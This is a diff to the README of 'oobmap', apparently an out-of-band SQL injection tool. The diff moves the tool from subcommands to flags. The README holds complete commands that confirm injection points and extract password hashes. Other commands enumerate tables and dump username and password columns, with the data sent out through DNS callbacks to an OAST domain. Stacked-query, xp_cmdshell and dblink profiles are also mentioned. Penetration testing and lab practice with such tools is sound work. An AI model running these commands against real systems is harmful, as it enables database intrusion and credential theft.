@@ -118,7 +118,7 @@ Connection: close
 First, verify that conditional OOB callbacks work:
 
 ```bash
-oobmap check \
+oobmap --check \
   -r req.txt \
   --dbms mssql \
   --domain abc123.oast.site \
@@ -127,15 +127,17 @@ oobmap check \
   --first
 ```
 
-Without `-p`, `check` scans injection points according to `--level`.
+Without `-p`, `--check` scans injection points according to `--level`.
 At `--level 2`, it tests query parameters, form body parameters, and cookies.
 When a point is confirmed, `oobmap` prints the exact `--place ... -p ...` pair
-to reuse for extraction.
+to reuse for extraction. `--check` is also the default action when no
+`--expr`/`--dump`/enum flag is given, so it can be omitted — pass it
+explicitly when you want the intent to be obvious in a saved command.
 
 If the check succeeds, extract a scalar expression:
 
 ```bash
-oobmap extract \
+oobmap \
   -r req.txt \
   -p TrackingId \
   --dbms mssql \
@@ -147,7 +149,7 @@ oobmap extract \
 For hex-like secrets, restrict the alphabet to make extraction faster:
 
 ```bash
-oobmap extract \
+oobmap \
   -r req.txt \
   -p TrackingId \
   --dbms mssql \
@@ -170,14 +172,14 @@ Check whether the target gives conditional callbacks. This can target one known
 parameter:
 
 ```bash
-oobmap check -r req.txt -p TrackingId --dbms mssql \
+oobmap --check -r req.txt -p TrackingId --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl
 ```
 
 Or scan several locations:
 
 ```bash
-oobmap check -r req.txt --dbms mssql \
+oobmap --check -r req.txt --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl \
   --level 3 --first
 ```
@@ -185,7 +187,7 @@ oobmap check -r req.txt --dbms mssql \
 Extract an arbitrary scalar SQL expression:
 
 ```bash
-oobmap extract -r req.txt -p TrackingId --dbms mssql \
+oobmap -r req.txt -p TrackingId --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl \
   --expr "SELECT DB_NAME()"
 ```
@@ -193,7 +195,7 @@ oobmap extract -r req.txt -p TrackingId --dbms mssql \
 Extract common metadata:
 
 ```bash
-oobmap enum -r req.txt -p TrackingId --dbms mssql \
+oobmap -r req.txt -p TrackingId --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl \
   --banner --current-user --current-db
 ```
@@ -201,7 +203,7 @@ oobmap enum -r req.txt -p TrackingId --dbms mssql \
 Enumerate tables:
 
 ```bash
-oobmap enum -r req.txt -p TrackingId --dbms mssql \
+oobmap -r req.txt -p TrackingId --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl \
   --tables --limit 20
 ```
@@ -209,7 +211,7 @@ oobmap enum -r req.txt -p TrackingId --dbms mssql \
 Enumerate columns for one table:
 
 ```bash
-oobmap enum -r req.txt -p TrackingId --dbms mssql \
+oobmap -r req.txt -p TrackingId --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl \
   --columns -T users --limit 20
 ```
@@ -217,7 +219,7 @@ oobmap enum -r req.txt -p TrackingId --dbms mssql \
 Dump rows from a table:
 
 ```bash
-oobmap dump -r req.txt -p TrackingId --dbms mssql \
+oobmap --dump -r req.txt -p TrackingId --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl \
   -T users -C username,password --limit 20
 ```
@@ -225,7 +227,7 @@ oobmap dump -r req.txt -p TrackingId --dbms mssql \
 If you omit `-C`, `oobmap` enumerates the columns first and then dumps them:
 
 ```bash
-oobmap dump -r req.txt -p TrackingId --dbms mssql \
+oobmap --dump -r req.txt -p TrackingId --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl \
   -T users --limit 20
 ```
@@ -233,7 +235,7 @@ oobmap dump -r req.txt -p TrackingId --dbms mssql \
 Dump with a filter:
 
 ```bash
-oobmap dump -r req.txt -p TrackingId --dbms mssql \
+oobmap --dump -r req.txt -p TrackingId --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl \
   -T users -C username,password --where "username='administrator'" --limit 1
 ```
@@ -241,7 +243,7 @@ oobmap dump -r req.txt -p TrackingId --dbms mssql \
 Use `-D` when the DBMS needs a database/schema/catalog:
 
 ```bash
-oobmap dump -r req.txt -p TrackingId --dbms postgres-program \
+oobmap --dump -r req.txt -p TrackingId --dbms postgres-program \
   --domain abc123.oast.site --log interactsh.jsonl \
   -D public -T users -C username,password
 ```
@@ -260,9 +262,13 @@ For automatic checks, `--level` controls where it looks:
 | `3` | Level 2 + common headers such as `User-Agent`, `Referer`, `X-Forwarded-For` |
 | `5` | Level 3 + most remaining headers |
 
-`--risk` is accepted for sqlmap-like workflows, but payload choice is currently
-driven by the selected OOB profile. Future versions will use `--risk` to choose
-between safer and more aggressive payload variants.
+`--risk` controls how many payload variants are tried *within* the selected
+profile (default `2`, matching the historical fixed set). `--risk 1` sends a
+single, minimal-noise variant; `--risk 3` adds extra comment-terminator
+variants for targets that reject the default set. `--risk` never changes the
+DBMS/profile, never disables `--validate`, and never enables stacked-query,
+`xp_cmdshell`, or `dblink` behavior — pick `--dbms mysql-stacked`,
+`--dbms mssql-cmdshell`, or `--dbms postgres-dblink` explicitly for that.
 
 Force a location:
 
@@ -283,7 +289,7 @@ Host: target.example
 Then run:
 
 ```bash
-oobmap extract -r req.txt -p ignored --place marker ...
+oobmap -r req.txt -p ignored --place marker --expr "SELECT DB_NAME()" ...
 ```
 
 For HTTPS targets saved as raw HTTP requests, add:
@@ -305,7 +311,7 @@ During extraction, every recovered prefix is saved. If a run is interrupted,
 running the same command again resumes from the next character:
 
 ```bash
-oobmap extract -r req.txt -p TrackingId --dbms mssql \
+oobmap -r req.txt -p TrackingId --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl \
   --expr "SELECT password FROM users WHERE username='administrator'"
 ```
@@ -318,11 +324,11 @@ Useful options:
 --fresh-queries     # ignore cached extraction values but keep other session data
 ```
 
-`dump` validates the target table and columns against the current session/catalog.
+`--dump` validates the target table and columns against the current session/catalog.
 If they are missing from the session, `oobmap` enumerates them first. This means:
 
 ```bash
-oobmap dump ... -T users
+oobmap --dump ... -T users
 ```
 
 will first discover the columns for `users`, then dump all discovered columns.
@@ -335,9 +341,9 @@ To skip validation and go straight to the query, provide `-C` and use:
 Examples:
 
 ```bash
-oobmap extract ... --output-dir ./oobmap-output
-oobmap extract ... --flush-session
-oobmap extract ... --fresh-queries
+oobmap ... --expr "SELECT DB_NAME()" --output-dir ./oobmap-output
+oobmap ... --expr "SELECT DB_NAME()" --flush-session
+oobmap ... --expr "SELECT DB_NAME()" --fresh-queries
 ```
 
 ## Payload Profiles
@@ -395,7 +401,7 @@ This avoids the slow pattern of waiting after every single character.
 3. Confirm OOB:
 
    ```bash
-   oobmap check -r req.txt --dbms mssql \
+   oobmap --check -r req.txt --dbms mssql \
      --domain abc123.oast.site --log interactsh.jsonl \
      --level 2 --first
    ```
@@ -403,7 +409,7 @@ This avoids the slow pattern of waiting after every single character.
 4. Reuse the confirmed injection point:
 
    ```bash
-   oobmap extract -r req.txt --place cookie -p TrackingId --dbms mssql \
+   oobmap -r req.txt --place cookie -p TrackingId --dbms mssql \
      --domain abc123.oast.site --log interactsh.jsonl \
      --expr "SELECT password FROM users WHERE username='administrator'"
    ```
@@ -430,7 +436,7 @@ Common blockers:
 - DNS caching delays callbacks;
 - the chosen alphabet does not contain the secret character.
 
-When in doubt, start with `oobmap check`.
+When in doubt, start with `oobmap --check`.
 
 ## Current Scope
 
